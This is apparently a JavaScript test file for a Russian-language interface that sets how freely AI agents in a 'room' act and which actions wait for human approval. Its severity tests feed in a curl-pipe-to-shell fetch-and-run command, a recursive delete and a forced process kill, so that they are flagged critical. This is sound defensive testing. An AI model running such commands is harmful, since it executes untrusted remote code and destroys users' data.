/**
 * autonomy-view.test.mjs — «Уровень автономии» комнаты (W27-E6), клиент без браузера.
 *
 * Проверяем то, что человек видит и нажимает:
 *  1) три уровня простыми словами: у каждого есть «сам делает» и «спросит»,
 *     и у каждого уровня есть хотя бы одно действие в жизни (карточка);
 *  2) предпросмотр «что изменится» — до подтверждения, с участниками и подсказкой
 *     про копию/отзыв; без изменений честно пишет «этот уровень уже включён»;
 *  3) список «только с моего да»: пустые/повторы выбрасываются, кривые записи
 *     объясняются словами, у каждой записи есть «убрать»;
 *  4) критичное отделено от рутины (severity), у критичной карточки есть
 *     «что именно» и действия: разрешить один раз / запретить / открыть карточку;
 *  5) журнал: строка = участник, действие, время, карточка; счётчика «нужно от вас»
 *     в журнале нет;
 *  6) видимые тексты — без терминов внутреннего устройства (проверка словарём).
 *
 * DOM — tests/fake-dom.mjs.
 */

import test from 'node:test';
import assert from 'node:assert/strict';

import { installFakeDom } from './fake-dom.mjs';

installFakeDom();

const {
  LEVELS, LEVEL_IDS, DEFAULT_LEVEL, NEVER_DEFAULTS, levelById, normalizeNever, neverProblem,
  humanClass, classifySeverity, previewFor, previewHeadline, levelChanged, applyBody,
  journalGroups, journalLine, journalSummary, whatExactly, criticalHeadline, suggestRows,
  levelCard, previewPanel, neverList, suggestList, criticalCard, criticalList, journalList,
  currentBanner,
} = await import('../web/js/views/autonomy.js');

const NOW = 1_764_100_000_000;   // «сейчас» для подписей времени

function textOf(node) {
  if (!node) return '';
  const own = node.nodeType === 3 ? node.data : '';
  const kids = Array.isArray(node.childNodes) ? node.childNodes.map(textOf).join(' ') : '';
  return (own + ' ' + kids).replace(/\s+/g, ' ').trim();
}

function walk(node, out = []) {
  if (!node) return out;
  out.push(node);
  for (const child of node.childNodes || []) walk(child, out);
  return out;
}

function byAttr(root, attr, value) {
  return walk(root).filter((n) => n.attributes && n.getAttribute(attr) === value);
}

const DATA = {
  room: 'demo',
  level: 'working',
  never: ['удаление папки целиком', 'отправка писем и сообщений'],
  updated_at: 1794000000,
  profiles: [
    { profile: 'p-ops', member_title: 'Анна', allowlist: ['script execution via -e/-c flag'], single_query_mode: 'deny', deny: [] },
    { profile: 'p-law', member_title: 'Лев', allowlist: ['script execution via -e/-c flag'], single_query_mode: 'deny', deny: [] },
  ],
  defaults: { never: ['удаление папки целиком'] },
  preview: {
    careful: { changes: ['запуск скриптов снова спрашивает вас'], note: 'Спокойный режим.' },
    working: { changes: ['свои скрипты участники запускают сами'], note: 'Рекомендуем.' },
    free: { changes: ['почти всё сами', 'останавливается только список «только с моего да» (2)'], note: 'Держите список полным.' },
  },
};

const JOURNAL = {
  room: 'demo',
  counts: { self: 2, blocked_critical: 1, blocked_routine: 1 },
  items: [
    { id: 'aj_1', kind: 'self', profile: 'p-ops', member_title: 'Анна', class: 'свои скрипты',
      severity: 'routine', at: Math.floor(NOW / 1000) - 3600, card: 'Собрать отчёт', request_id: 't_0001aaaa' },
    { id: 'aj_2', kind: 'self', profile: 'p-law', member_title: 'Лев', class: 'чтение файлов в папке комнаты',
      severity: 'routine', at: Math.floor(NOW / 1000) - 7200, card: 'Проверить договор', request_id: 't_0002bbbb' },
    { id: 'ap_crit', approval_id: 'ap_crit', kind: 'blocked', profile: 'p-ops', member_title: 'Анна',
      class: 'удаление каталога целиком', severity: 'critical', at: Math.floor(NOW / 1000) - 600,
      card: 'Собрать отчёт', request_id: 't_0001aaaa', room: 'demo',
      what: ['C:/Work/Rooms/demo/архив — 14 файлов', 'после удаления вернуть нельзя'] },
    { id: 'ap_rout', approval_id: 'ap_rout', kind: 'blocked', profile: 'p-law', member_title: 'Лев',
      class: 'execute_code', severity: 'routine', at: Math.floor(NOW / 1000) - 900,
      card: 'Проверить договор', request_id: 't_0002bbbb', room: 'demo', command: 'python -c "print(1)"' },
  ],
};

/* ─────────────────────────────────────────────────────── 1. три уровня */

test('три уровня: порядок, подписи и «сам делает / спросит» у каждого', () => {
  assert.deepEqual(LEVEL_IDS, ['careful', 'working', 'free']);
  assert.equal(DEFAULT_LEVEL, 'working');
  assert.equal(levelById('free').title, 'Свободный');
  assert.equal(levelById('неизвестно').id, 'working', 'незнакомый уровень — рабочий, а не пустота');
  for (const lvl of LEVELS) {
    assert.ok(lvl.title && lvl.plain, 'название и одна строка «в двух словах»');
    assert.ok(Array.isArray(lvl.self) && lvl.self.length, lvl.id + ': что делает сам');
    assert.ok(Array.isArray(lvl.ask) && lvl.ask.length, lvl.id + ': что спросит');
  }
  // У «Свободного» честно сказано, что спросить там некому — иначе человек обманут.
  assert.match(levelById('free').warn, /останавливается/);
});

test('карточка уровня: две строки «Сам делает»/«Спросит» и пометка «сейчас»', () => {
  const card = levelCard(levelById('working'), { current: 'working', picked: 'free' });
  const text = textOf(card);
  assert.match(text, /Рабочий/);
  assert.match(text, /Сам делает/);
  assert.match(text, /Спросит/);
  assert.match(text, /сейчас/);
  assert.equal(card.getAttribute('role'), 'radio');
  assert.equal(card.getAttribute('aria-checked'), 'false');

  const picked = levelCard(levelById('free'), { current: 'working', picked: 'free' });
  assert.equal(picked.getAttribute('aria-checked'), 'true');
  assert.match(picked.className, /aut-level--picked/);

  // Клик по карточке выбирает уровень (а не применяет молча).
  let chosen = '';
  const clickable = levelCard(levelById('careful'), { current: 'working', onPick: (id) => { chosen = id; } });
  clickable.dispatch('click');
  assert.equal(chosen, 'careful');
});

/* ─────────────────────────────────────────── 2. предпросмотр изменений */

test('предпросмотр: изменения с сервера, участники и предупреждение о копии', () => {
  const p = previewFor(DATA, 'careful');
  assert.deepEqual(p.changes, ['запуск скриптов снова спрашивает вас']);
  assert.deepEqual(p.profiles, ['Анна', 'Лев']);
  assert.equal(p.warned, false);
  assert.equal(previewFor(DATA, 'free').warned, true, 'у свободного уровня есть предупреждение');
  assert.match(previewHeadline(DATA, 'free'), /Свободный/);
  assert.match(previewHeadline(DATA, 'free'), /2 участникам/);
});

test('предпросмотр без данных сервера всё равно объясняет уровень словами', () => {
  const p = previewFor({ level: 'careful', profiles: [] }, 'working');
  assert.ok(p.changes.length >= 1);
  assert.match(p.changes[0], /сам/);
  assert.match(previewHeadline({ profiles: [] }, 'working'), /участников в ней пока нет/);
});

test('блок предпросмотра: кнопки «Применить» и «Отмена», пометка «уже включён»', () => {
  let applied = '';
  let cancelled = false;
  const box = previewPanel(DATA, 'free', { onApply: (id) => { applied = id; }, onCancel: () => { cancelled = true; } });
  const text = textOf(box);
  assert.match(text, /Что изменится/);
  assert.match(text, /Участники: Анна, Лев/);
  assert.match(text, /копию настроек/);
  assert.equal(box.getAttribute('data-preview'), 'free');

  byAttr(box, 'data-apply-level', 'free')[0].dispatch('click');
  assert.equal(applied, 'free');
  byAttr(box, 'data-cancel-preview', '1')[0].dispatch('click');
  assert.equal(cancelled, true);

  const same = previewPanel(DATA, 'working');
  assert.match(textOf(same), /этот уровень уже включён/);
  assert.equal(levelChanged(DATA, 'working'), false);
  assert.equal(levelChanged(DATA, 'careful'), true);
});

test('тело запроса всегда с подтверждением (без него сервер отвечает 409)', () => {
  const body = applyBody('free', [' удаление  папки ', 'удаление папки', '']);
  assert.equal(body.level, 'free');
  assert.equal(body.confirm, true);
  assert.deepEqual(body.never, ['удаление папки'], 'пробелы и повторы убраны');
  assert.equal(applyBody('мусор').level, 'working');
});

/* ────────────────────────────────────── 3. список «только с моего да» */

test('список «только с моего да»: повторы и пустые выбрасываются', () => {
  assert.deepEqual(normalizeNever(['  удаление  папки ', 'Удаление папки', '', null, 'отправка писем']),
    ['удаление папки', 'отправка писем']);
  assert.deepEqual(normalizeNever(null), []);
  assert.ok(NEVER_DEFAULTS.length >= 5, 'в подсказке есть что показать');
});

test('кривая запись объясняется словами, а не молчит', () => {
  assert.match(neverProblem('', []), /Напишите/);
  assert.match(neverProblem('  rm', []), /Слишком коротко/);
  assert.match(neverProblem('x'.repeat(140), []), /120/);
  assert.match(neverProblem('удаление папки', ['Удаление папки']), /уже есть/);
  assert.equal(neverProblem('удаление папки вне комнаты', ['отправка писем']), '');
});

test('список: у каждой записи есть «убрать», добавление — кнопкой и Enter', () => {
  const removed = [];
  const added = [];
  const box = neverList(['удаление папки целиком', 'отправка писем'], {
    onRemove: (t) => removed.push(t), onAdd: (t) => added.push(t),
  });
  const text = textOf(box);
  assert.match(text, /только с вашего «да»/);
  const removeButtons = walk(box).filter((n) => /aut-never__x/.test(n.className || ''));
  assert.equal(removeButtons.length, 2, 'у каждой записи свой крестик');
  removeButtons[0].dispatch('click');
  assert.deepEqual(removed, ['удаление папки целиком']);

  const input = byAttr(box, 'data-never-input', '1')[0];
  input.value = 'запись в файлы с паролями';
  byAttr(box, 'data-never-add', '1')[0].dispatch('click');
  assert.deepEqual(added, ['запись в файлы с паролями']);

  // Плохая запись: ничего не добавляется, но человек видит причину словами.
  const box2 = neverList(['удаление папки'], { onAdd: (t) => added.push(t) });
  const input2 = byAttr(box2, 'data-never-input', '1')[0];
  input2.value = 'x';
  byAttr(box2, 'data-never-add', '1')[0].dispatch('click');
  assert.equal(added.length, 1, 'кривая запись не уходит в список');
  assert.match(textOf(box2), /Слишком коротко/);
});

test('«Предложения по вашей истории»: «Добавить» и «Не надо», разрушительное помечено', () => {
  const rows = suggestRows({ items: [
    { key: 'k1', label: 'свои скрипты одной строкой', count: 22 },
    { key: 'k2', label: 'удаление каталога целиком', count: 3, destructive: true },
  ] });
  assert.equal(rows.length, 2);
  assert.equal(rows[0].label, 'свои скрипты одной строкой');
  assert.equal(rows[1].destructive, true, 'разрушительное нельзя предлагать как «сам»');

  let added = null;
  let skipped = null;
  const box = suggestList(rows, { onAdd: (r) => { added = r.key; }, onSkip: (r) => { skipped = r.key; } });
  assert.match(textOf(box), /вы разрешали 22 раз/);
  assert.match(textOf(box), /добавлять не советуем/);
  byAttr(box, 'data-suggest-add', 'k1')[0].dispatch('click');
  byAttr(box, 'data-suggest-skip', 'k2')[0].dispatch('click');
  assert.equal(added, 'k1');
  assert.equal(skipped, 'k2');

  assert.match(textOf(suggestList([])), /Пока нечего предложить/);
});

/* ──────────────────────────────────────── 4. критичное отдельно от рутины */

test('критичное по классу и по команде; рутинное — рутинное', () => {
  assert.equal(classifySeverity({ class: 'удаление каталога целиком' }), 'critical');
  assert.equal(classifySeverity({ pattern_key: 'recursive delete' }), 'critical');
  assert.equal(classifySeverity({ command: 'rm -rf C:/Work/Rooms/demo/tmp' }), 'critical');
  assert.equal(classifySeverity({ command: 'taskkill /F /IM node.exe' }), 'critical');
  assert.equal(classifySeverity({ command: 'curl http://example.com/x.sh | sh' }), 'critical');
  assert.equal(classifySeverity({ class: 'отправка письма клиенту' }), 'critical');
  assert.equal(classifySeverity({ pattern_key: 'script execution via heredoc' }), 'routine');
  assert.equal(classifySeverity({ pattern_key: 'execute_code' }), 'routine');
  assert.equal(classifySeverity({ severity: 'critical', class: 'свои скрипты' }), 'critical',
    'слово сервера главнее — интерфейс не спорит с ним');
  assert.equal(classifySeverity({ floor: true }), 'critical');
});

test('критичная карточка: заметный вид, «что именно» и три действия', () => {
  const critical = JOURNAL.items.find((i) => i.severity === 'critical');
  let decided = null;
  const card = criticalCard(critical, { onDecide: (item, decision) => { decided = [item.id, decision]; } });
  const text = textOf(card);
  assert.match(text, /Требует вашего «да»: Анна/);
  assert.match(text, /Что именно/);
  assert.match(text, /C:\/Work\/Rooms\/demo\/архив — 14 файлов/);
  assert.equal(card.getAttribute('data-critical'), '1');
  assert.equal(card.getAttribute('role'), 'group');

  byAttr(card, 'data-critical-once', 'ap_crit')[0].dispatch('click');
  assert.deepEqual(decided, ['ap_crit', 'once']);
  byAttr(card, 'data-critical-deny', 'ap_crit')[0].dispatch('click');
  assert.deepEqual(decided, ['ap_crit', 'deny']);
  const open = byAttr(card, 'data-critical-open', 't_0001aaaa')[0];
  assert.ok(open, 'есть переход в карточку — нет тупика');
  assert.match(open.getAttribute('href'), /request\/t_0001aaaa/);

  assert.match(textOf(criticalList([])), /Ничего не ждёт вашего «да»/);
  assert.equal(byAttr(criticalList(JOURNAL.items.filter((i) => i.severity === 'critical')), 'data-critical', '1').length, 1);
});

test('жёсткий запрет: «Разрешить один раз» нет, есть «Сообщить участнику» (без тупика)', () => {
  const floor = {
    id: 'ap_floor', kind: 'blocked', severity: 'critical', floor: true, grantable: false,
    member_title: 'Лев', class: 'удаление каталога целиком', at: Math.floor(NOW / 1000),
    card: 'Собрать отчёт', request_id: 't_0001aaaa', room: 'demo',
  };
  let decision = null;
  const card = criticalCard(floor, { onDecide: (item, d) => { decision = [item.id, d]; } });
  const text = textOf(card);
  assert.match(text, /разрешить нельзя/);
  assert.match(text, /встроен в саму программу/);
  assert.equal(byAttr(card, 'data-critical-once', 'ap_floor').length, 0,
    'кнопки, которая всё равно не сработает, нет');
  byAttr(card, 'data-critical-hint', 'ap_floor')[0].dispatch('click');
  assert.deepEqual(decision, ['ap_floor', 'hint_agent']);
  assert.match(card.className, /aut-crit--locked/);
});

test('что именно: команды и пути собираются без дублей', () => {
  assert.deepEqual(whatExactly({ what: ['a', 'b'] }), ['a', 'b']);
  assert.deepEqual(whatExactly({ command: 'rm -rf x' }), ['rm -rf x']);
  assert.deepEqual(whatExactly({ commands: [{ command: 'a' }, 'b', { command: 'a' }] }), ['a', 'b']);
  assert.deepEqual(whatExactly({}), []);
});

/* ─────────────────────────────────────────────────────── 5. журнал */

test('журнал делится на «сделано само» и остановленное, критичное — отдельно', () => {
  const g = journalGroups(JOURNAL);
  assert.equal(g.self.length, 2);
  assert.equal(g.critical.length, 1);
  assert.equal(g.routine.length, 1);
  assert.equal(g.total, 4);
  // Свежие — сверху.
  assert.ok(g.critical[0].at >= (g.critical[1] || { at: 0 }).at);
});

test('строка журнала: участник, действие, время, карточка — и никакого «нужно от вас»', () => {
  const item = JOURNAL.items[0];
  const line = journalLine(item, NOW);
  assert.match(line, /Анна/);
  assert.match(line, /свои скрипты/);
  assert.match(line, /«Собрать отчёт»/);
  assert.match(line, /час|минут|назад/);
  assert.doesNotMatch(line, /нужно от вас/i);

  const summary = journalSummary(JOURNAL);
  assert.match(summary, /сделано само: 2/);
  assert.match(summary, /ждёт вашего да: 1/);
  assert.doesNotMatch(summary, /нужно от вас/i);

  const list = journalList(g_self(), {});
  assert.equal(byAttr(list, 'data-journal-kind', 'self').length, 2);
  assert.match(textOf(journalList([], {})), /Пока пусто/);
});

function g_self() {
  return journalGroups(JOURNAL).self;
}

test('плашка «сейчас включено» называет уровень и число правил', () => {
  const banner = currentBanner(DATA);
  const text = textOf(banner);
  assert.match(text, /Сейчас: Рабочий/);
  assert.match(text, /только с вашего да: 2 правила/);
  assert.equal(banner.getAttribute('data-level-now'), 'working');
});

/* ────────────────────────────────────────── 6. видимые тексты по-русски */

test('в видимых текстах нет терминов внутреннего устройства', () => {
  const forbidden = [
    /allowlist/i, /deny/i, /single_query_mode/i, /execute_code/i, /approvals?\./i,
    /профиль/i, /Hermes/i, /yolo/i, /hardline/i, /severity/i, /JSON/i,
  ];
  const nodes = [
    currentBanner(DATA),
    levelCard(levelById('free'), { current: 'working', picked: 'free' }),
    previewPanel(DATA, 'free'),
    neverList(DATA.never, {}),
    suggestList(suggestRows({ items: [{ key: 'k1', label: 'свои скрипты одной строкой', count: 22 }] })),
    criticalCard(JOURNAL.items[2], {}),
    journalList(journalGroups(JOURNAL).self, {}),
  ];
  for (const node of nodes) {
    const text = textOf(node);
    for (const re of forbidden) {
      assert.doesNotMatch(text, re, 'нашлось «' + re + '» в: ' + text.slice(0, 160));
    }
  }
});

test('человеческие названия правил вместо технических', () => {
  assert.equal(humanClass('script execution via -e/-c flag'), 'свои скрипты');
  assert.equal(humanClass('recursive delete'), 'удаление файлов');
  assert.equal(humanClass('execute_code'), 'свой код');
  assert.equal(humanClass('sudo apt install'), 'права администратора');
  assert.equal(humanClass(''), 'действие');
  assert.equal(humanClass('что-то своё'), 'что-то своё');
  assert.match(criticalHeadline(JOURNAL.items[3]), /Лев/);
});
